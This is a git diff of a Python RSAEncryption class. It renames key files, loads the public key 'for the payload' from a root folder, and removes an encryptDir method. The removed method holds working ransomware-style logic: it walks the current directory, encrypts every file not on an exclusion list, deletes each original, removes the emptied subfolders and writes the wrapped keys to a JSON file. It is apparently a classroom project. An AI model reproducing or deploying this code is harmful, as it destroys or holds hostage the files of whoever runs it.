@@ -24,9 +24,9 @@ class RSAEncryption:
     # using the same constant file path.
     def findRSAKey(self, filepath):
         # Check if PEM file exists in directory
-        if os.path.isfile(os.path.join(filepath,'private.pem')):
+        if os.path.isfile(os.path.join(filepath,'priv.pem')):
             # Get private key from PEM file
-            with open(os.path.join(filepath,'private.pem'), 'rb') as pem_load:
+            with open(os.path.join(filepath,'priv.pem'), 'rb') as pem_load:
                 private_key = serialization.load_pem_private_key(
                     pem_load.read(),
                     password=None,
@@ -34,6 +34,12 @@ class RSAEncryption:
                 )
                 # Retreive public key from private key
                 public_key = private_key.public_key()
+                pub_pem = public_key.public_bytes(
+                    encoding=serialization.Encoding.PEM,
+                    format=serialization.PublicFormat.SubjectPublicKeyInfo
+                )
+                with open(os.path.join(filepath,'pub.pem'), 'wb') as pub_write:
+                    pub_write.write(pub_pem)
         # If PEM file doesn't exist we must create keys and store them 
         else:
             private_key = rsa.generate_private_key(
@@ -41,20 +47,20 @@ class RSAEncryption:
                 key_size=var.RSAKEYSIZE,
                 backend=default_backend()
             )
-            pem = private_key.private_bytes(
+            priv_pem = private_key.private_bytes(
                 encoding=serialization.Encoding.PEM,
                 format=serialization.PrivateFormat.TraditionalOpenSSL,
                 encryption_algorithm=serialization.NoEncryption()
             )
-            with open(os.path.join(filepath,'private.pem'), 'wb') as priv_write:
-                    priv_write.write(pem)
+            with open(os.path.join(filepath,'priv.pem'), 'wb') as priv_write:
+                    priv_write.write(priv_pem)
 
             public_key = private_key.public_key()
             pub_pem = public_key.public_bytes(
                 encoding=serialization.Encoding.PEM,
                 format=serialization.PublicFormat.SubjectPublicKeyInfo
             )
-            with open(os.path.join(filepath,'public.pem'), 'wb') as pub_write:
+            with open(os.path.join(filepath,'pub.pem'), 'wb') as pub_write:
                 pub_write.write(pub_pem)
             
         return private_key, public_key
@@ -65,16 +71,20 @@ class RSAEncryption:
     # Lastly, you encrypt the key variable ("key"= EncKey+ HMACKey (concatenated)) using the RSA publickey in OAEP 
     # padding mode. The result will be RSACipher. 
     # You then return (RSACipher, C, IV, ext).
-    def encryptRSA(self, filepath, RSA_Publickey_Filepath):
+    def encryptRSA(self, root,  filepath): #,  RSA_Publickey_Filepath):
+        
+        # generate public key for the payload
+        _ , pubk = self.findRSAKey(root)
+
         # (ct, ekey, hkey, iv, tag, ext) = MyfileEncryptMAC(filepath)
         ct, ek, hk, iv, htag, ext = self.fileEncryptHMAC(filepath)
 
         # Initialize RSA Public Key Encryption Object
-        with open(RSA_Publickey_Filepath, 'rb') as pub_read:
-            public_key = serialization.load_pem_public_key(pub_read.read(), backend=default_backend())
+        # with open(RSA_Publickey_Filepath, 'rb') as pub_read:
+            # public_key = serialization.load_pem_public_key(pub_read.read(), backend=default_backend())
 
         # Encrypt the key variable ("key = EncKey + HMACKey")
-        RSACipher = public_key.encrypt(
+        RSACipher = pubk.encrypt(
             ek+hk,
             rsa_padding.OAEP(
                 mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
@@ -218,39 +228,3 @@ class RSAEncryption:
         plain_text = unpadder.update(pt) + unpadder.finalize()
     
         return plain_text
-
-    def encryptDir(self):
-        currentDir = os.getcwd()
-        filesList = []
-
-        # Fetch a list of all files within the root directory
-        for root, dirs, files in os.walk(currentDir):
-            for file in files:
-                file = root + "\\" + file
-                if file not in filesList and file.split("\\")[-1] not in var.EXCLUSIONS:
-                    filesList.append(file)
-                    
-        encryptedFiles = []
-
-        # Encrypting each files in the list of files
-        for file in filesList:
-            # Returns  RSACipher, ct, iv, htag, ext
-            data = self.encryptRSA(file, "public.pem")
-            data = {"RSACipher": data[0], "CT": data[1], "IV": data[2], "tag": data[3], "ext": data[4]}
-            data["RSACipher"] = base64.encodebytes(data["RSACipher"]).decode("ascii")
-            data["CT"] = base64.encodebytes(data["CT"]).decode("ascii")
-            data["IV"] = base64.encodebytes(data["IV"]).decode("ascii")
-            data["TAG"] = base64.encodebytes(data["TAG"]).decode("ascii")
-            data["EXT"] = base64.encodebytes(data["EXT"]).decode("ascii")
-            encryptedFiles.append(data)
-            os.remove(file)
-
-        # Removing empty subfolders
-        for root, dirs, files in os.walk(currentDir, topdown = False):
-            for dirName in dirs:
-                os.rmdir(os.path.realpath(os.path.join(root, dirName)))
-        
-        # Writing encryption data to JSON file
-        with open("encFile.json", "w") as jFile:    
-            encryptedFiles = json.dumps(encryptedFiles)
-            jFile.write(encryptedFiles)
